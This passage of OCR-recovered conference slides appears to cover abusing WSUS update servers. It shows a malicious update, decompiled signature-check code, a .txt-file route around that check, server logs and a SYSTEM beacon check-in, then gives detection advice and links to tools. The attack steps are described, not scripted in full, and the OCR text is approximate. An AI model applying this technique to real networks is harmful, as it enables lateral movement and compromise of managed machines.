[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] |"GET /Specter.exe HTTP/1.1" 206 -
[10.2.10.3] ["GET /Specter.exe HTTP/1.1" 206 -
```

## Slide 55

# **Exploitation Difficulty**

- W SUS Administrator

- W SUS File System Access

- Digitally Signature

**Nunito Sans**

**55**

## Slide 56

# Blocker: Trouble Downloading

56


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Blocker: Trouble Downloading
Specter
¢.4) The files for this update failed to download. The update can be approved but will not be available to computers until
the download is complete. Click Retry Download to start the download again.
Status: MSRC severity: Critical
0 h errors MSRC number:
Release date: Saturday, August 30, 2025
KB article numbers: 5006103
~omputers installed/not applica
B® Computers with no status:
Description
Install this update to resolve issues in Windows.
56
```

## Slide 57

Bypassing Signature Verification **Bypassing Signature Verification**

57


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Lateral Movement
A key consideration with WSUS lateral movement is that there is no way to control when a client checks in from the
server. This means that once a patch is deployed the lateral movement won’t succeed until the client installs the
update. Often times the client will check in for patches on a regular cycle, for example daily, but the patches won’t
be installed until a patching day that might happen once a month. Some clients may be configured to install
patches immediately if their priority level is high enough.
The first step of abusing WSUS is to create the malicious patch, which does have some limitations. When creating
the patch there are various values that can be configured through the command line in SharpWSUS, allowing the
operator to change the Indicators of Compromise (loCs) of the patch. There is also a value for the payload and
arguments. |The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS
server to that binary.
While the need for a signed binary can limit some attack paths, there are still plenty of binaries that could be used
such as PsExec.exe to run a command as SYSTEM, RunDLL32.exe to run a malicious DLL on a network
share, MsBuild.exe to grab and execute a remote payload and more. The example in this blog will use PsExec.exe for
code execution (https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
A patch leveraging PsExec.exe can be done with the following command:
```

## Slide 58

Bypassing Signature V erification Bypassing Signature V erification

58


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
2025-12-20 20:29:13.464 UTC Info WsusService. 34
ContentSyncAgent.ContentSyncSPFireStateMachineEvent ContentSyncAgent| firing Event:
FileVerificationFailed for Item: e1e609f1-436e-4fba-a9d@-3291eb717ecd
58
```

## Slide 59

Bypassing Signature V erification Bypassing Signature V erification

59


> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
This PC » Windows 10 (C:) Program Files >» Update Services
en-US
Microsoft.UpdateServices.CatalogSyncAgent.dll
Microsoft.UpdateServices.ContentSyncAgent.dll
Microsoft.UpdateServices.Reporting.Rollup.dll
Microsoft.Windows.BITS.dll
WSusCertServer
WsusService
WsusService.exe.config
Services
```

## Slide 60

60


> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
GF dnSpy v6.1.8 (64-bit, NET)
File Edit View
Debug Window Help @ © i! C# >|| ‘2
4 4$ ContentSyncAgent @02000005
Base Type and Interfaces
Derived Types
.cctorQ) : void @06000030
ContentSyncAgent() : void @06000010
CleanupAfterBitsFailure(string) : void @06000019
ConstructFileUrlOnUss(byte[], string) : string @0600002B
ContentSyncSPFireStateMachineEvent(DataAccess, Guid, string, string) : voi
Download(ref string, ref string, ref string, FileNeededByContentAgent, ref |B
EnqueueNotification(Guid, bool) : void @06000018
EventReportingContentFile(string, string, string, Updateldentity[], WsusEven
EventReportingContentFile(string, string, string, Updateldentity[], WsusEven
EventReportingContentSyncAgent(short, string) : void @0600002D
ExecuteSPGetExportUpdateData(int) : ExportUpdateData @06000022
ExecuteSPGetNextContentSyncWorkitem() : FileNeededByContentAgent @(
ExecuteSPGetNextContentSyncWorkltemOnStartup(byte[]) : FileNeededByC
ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
GetUNCFilePath(string) : string @06000013
GetUpdatesForFile(Guid) : UpdatelnformationForFile @06000023
60
```

## Slide 61

61


> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
GF dnSpy v6.1.8 (64-bit, NET)
File Edit View Debug Window Help @ © i CG ~|| 9
4 4$ ContentSyncAgent @02000005
> Mi Base Type and Interfaces
Derived Types
.cctorQ) : void @06000030
ContentSyncAgent() : void @06000010
CleanupAfterBitsFailure(string) : void @06000019
ConstructFileUrlOnUss(byte[], string) : string @0600002B
ContentSyncSPFireStateMachineEvent(DataAccess, Guid, string, string) : voi
Download(ref string, ref string, ref string, FileNeededByContentAgent, ref |B
EnqueueNotification(Guid, bool) : void @06000018
EventReportingContentFile(string, string, string, Updateldentity[], WsusEven
EventReportingContentFile(string, string, string, Updateldentity[], WsusEven
EventReportingContentSyncAgent(short, string) : void @0600002D
ExecuteSPGetExportUpdateData(int) : ExportUpdateData @06000022
ecutesPoetvextC ontentSyncWorkitemOnStartup(byte[]) : FileNeededByC
ExecuteSPNotifyContentSyncNotificationEventWorking() : void @06000021
GetUNCFilePath(string) : string @06000013
GetUpdatesForFile(Guid) : UpdatelnformationForFile @06000023
61
```

## Slide 62

62


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
private VerifyResult VerifyFile(string fileLocalPath, string additionalHash)
{
if (fileLocalPath == null)
{
throw new ArgumentNullException("fileLocalPath”");
}
VerifyResult verifyResult = ContentSyncAgent.VerifyCRC(fileLocalPath,
additionalHash) ? VerifyResult.Valid : VerifyResult.InvalidCRc;
if (verifyResult == VerifyResult.Valid)
{
bool flag = true;
if (fileLocalPath. ToLower(CultureInfo. InvariantCulture).Endswith
flag = false;
t
if (flag)
t
verifyResult = |(CabUtilities.CheckCertificateSignature
(fileLocalpath, true) ? VerifyResult.Valid :
VerifyResult.Invalidcert);
}
}
return verifyResult;
62
```

## Slide 63

Bypassing Signature V erification Bypassing Signature V erification

63


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
[10.2.10.3] "HEAD /Ghost.txt HTTP/1.1" 200 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
[10.2.10.3] "GET /Ghost.txt HTTP/1.1" 206 -
```

## Slide 64

Bypassing Signature V erification Bypassing Signature V erification

64


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
MSRC severity: Critical
e MSRC number:
nf 5 g Release date: Saturday, August 30, 2025
nputers plic KB article numbers: 5006103
BH Computers with no status:
Description
Install this update to resolve issues in Windows.
Additional Details
More information:
Removable: Yes
Restart behavior: Can request restart
May request user input: No
Must be installed exclusively: No
Microsoft Software License Terms: — This update does not have Microsoft Software License Terms.
Products: None
Updates superseding this update: None
Updates superseded by this update: None
Languages supported: All
Update ID: 0a93df0b-afd2-449e-8a52-0115a0de686d
```

## Slide 65

Bypassing Signature V erification Bypassing Signature V erification

65


> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
2025-12-20 21:31:19.878 UTC Info WsusService.22 ContentSyncAgent.ContentSyncSPFireStateMachineEvent
ContentSyncAgent firing Event:) FileVerified| for Item: fb101@eb-cca7-42df-a130-9eccb4d0f581
2025-12-20 21:31:19.878 UTC Info WsusService.22 EventLogEventReporter.ReportEvent
EventId=366, Type=Information, Category=Synchronization jMessage=Content file download succeeded.
Digest:
Source File: /Ghost.txt
Destination File: C:\\WSUS\WsusContent\95\4861DE7211476BAC49F126F6946AF29880CFD995. txt
65
```

## Slide 66

Bypassing Signature V erification Bypassing Signature V erification

66


> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
Windows Update
K_/ Last checked: Today, 4:38 PM
66
```

## Slide 67

Bypassing Signature V erification Bypassing Signature V erification

67


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypassing Signature Verification
Bypassing Signature Verification
ll] HOST | USER ll DOMAIN | PID | LAST CHECKIN
WORKSTATION2 SYSTEM LUDUS 10088 15 seconds
ll DESCRIPTION
Whooooohoooo0000! ! !
67
```

## Slide 68

# Exploitation Difficulty

- W SUS Administrator

- W SUS File System Access

- Digitally Signature

68


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploitation Difficulty
¢ WSUS Administrator
¢ WSUS File System Access
¢ Digitally Signature
@
McDelivery |
| Uber
| Eats
68
```

## Slide 69

69


> Recovered by OCR — confidence 87/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
root@Ludus3: /mnt/remote-share/WSUSpicious# |
Activate Windo
“Ludus3" 20:28 30-Dec-2
69
```

## Slide 70

# W SUS Client Setting Options

70


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
W SUS Client Setting Options
Setting
Defer Windows Updates
Do not display ‘Install Updates and Shut Down’ option in Sh...
Do not adjust default option to ‘Install Updates and Shut
Enabling Windows Update Power Management to automati...
Turn off auto-restart for updates during active hours
Always automatically restart at the scheduled time
Specify deadline before auto-restart for update installation
Configure Automatic Updates
Specify intranet Microsoft update service location
Automatic Updates detection frequency
Remove access to use all Windows Update features
Do not connect to any Windows Update Internet locations
Allow non-administrators to receive update notifications
Do not include drivers with Windows Updates
Turn on Software Notifications
Allow Automatic Updates immediate installation
Turn on recommended updates via Automatic Updates
No auto-restart with logged on users for scheduled automat...
Re-prompt for restart with scheduled installations
Delay Restart for scheduled installations
Reschedule Automatic Updates scheduled installations
Enable client-side targeting
Allow signed updates from an intranet Microsoft update ser...
State
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Not configured
Comment
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
No
70
```

## Slide 71

71


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
® Configure Automatic Updates
FE} Configure Automatic Updates Previous Setting Next Setting
ONot Configured Comment:
@ Enabled
O Disabled
Supported on: | Windows XP Professional Service Pack 1 or At least Windows 2000 Service Pack 3
Options: Help:
accidental data loss.
Configure automatic updating
uto download and notify for install Automatic maintenance can be further configured by using
Group Policy settings here: Computer Configuration-
‘or download and notify for install 5 :
uto download and notify for install
| 4- Auto download and schedule the install |_| > Maintenance Scheduler
3 - Allow Tocal admin to choose setting — .
t= 7 5 = Allow local administrators to select the configuration
mode that Automatic Updates should notify and install updates.
Scheduled install day
With this option, local administrators will be allowed to use
the Windows Update control panel to select a configuration
Scheduled install tir 03:00 L option of their choice. Local administrators will not be allowed to
disable the configuration for Automatic Updates.
0 - Every day
(] Install updates for other Micr
If the status for this policy is set to Disabled, any updates that are
available on Windows Update must be downloaded and installed
manually. To do this, search for Windows Update using Start.
If the status is set to Not Configured, use of Automatic Updates
is not specified at the Group Policy level. However, an
Cancel Apply
71
```

## Slide 72

# Prevention and Detection

On the W SUS Database server:

- Extended Protection for Authentication (EPA)

- Only allow network access from the W SUS server and administrative locations to the database

- Monitor the execution of the spCreateTargetGroups stored procedure

- Monitor the execution of spSetBatchURL for update files ending in .txt or .esd

- Monitor the execution of spDeployUpdate from non-computer accounts

72

## Slide 73

# Goodies Ludus W SUS Range

73


> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Goodies
Ludus WSUS Range
WSUS Collection for Ansible and Ludus
This collection includes Ansible roles to install WSUS. For a good example of the collection’s usage, see the wWSUS-
Range.yml .
Roles included in this collection:
Associated Blogpost: TBD
Installation in Ludus
Install via Ansible Gala»
ludus ansible collection add bagelbyt3s.1udus_wsus
73
```

## Slide 74

# Goodies NotW SUSpicious.py

74


> Recovered by OCR — confidence 86/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Goodies
BP main ~ P 1Branch © 0 Tags
@ bagelByt3s Fixed <
1 README
NotWSUSpicious
/\__//
Fixed ascii ar
Updated for
Add file ~
1 minute ago
© Watch
<> Code ~
© 14 commits
yesterday
yesterday
1 minute
6 minut
ago
ago
~ & Fork o WW Star 0
About 8
Python helper to generate SQL
commands to create a custom update in
the Windows Service Update Service
(WSUS) database.
> 0 watching
Packages
No packages published
Publis first package
```

## Slide 75

# Goodies

- https://github.com/bagelByt3s/ludus_wsus

- https://github.com/bagelByt3s/NotWSUSpicious

- https://specterops.io/blog/2026/08/05/turning-enterprise-update-serversinto-backdoor-factories-part-1/

- https://specterops.io/blog/2026/08/05/turning-enterprise-update-serversinto-backdoor-factories-part-2/

- https://specterops.io/blog/2026/08/05/built-a-wsus-ludus-lab/

- https://specterops.io/blog/2026/08/05/weaponizing-windows-updates-withnotwsuspicious/

75

## Slide 76

# References

- https://learn.microsoft.com/en-us/previousversions/windows/desktop/bb902491(v=vs.85))

- https://blackhat.com/docs/us-17/wednesday/us-17-Coltel-WSUSpendu-UseWSUS-To-Hang-Its-Clients-wp.pdf

- https://github.com/nettitude/SharpWSUS

- https://learn.microsoft.com/de-de/securityupdates/windowsupdateservices/18127375

- <u>https://posts.specterops.io/the-renaissance-of-ntlm-relay-attacks-everything-youneed-to-know-abfc3677c34e</u>

- https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attacktechniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md

76

## Slide 77

# Thank You

@ bagelByt3s Beyviel David

Thank you


> Recovered by OCR — confidence 84/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Thank You
X @ bagelByt3s
in Beyviel David a
SS
```
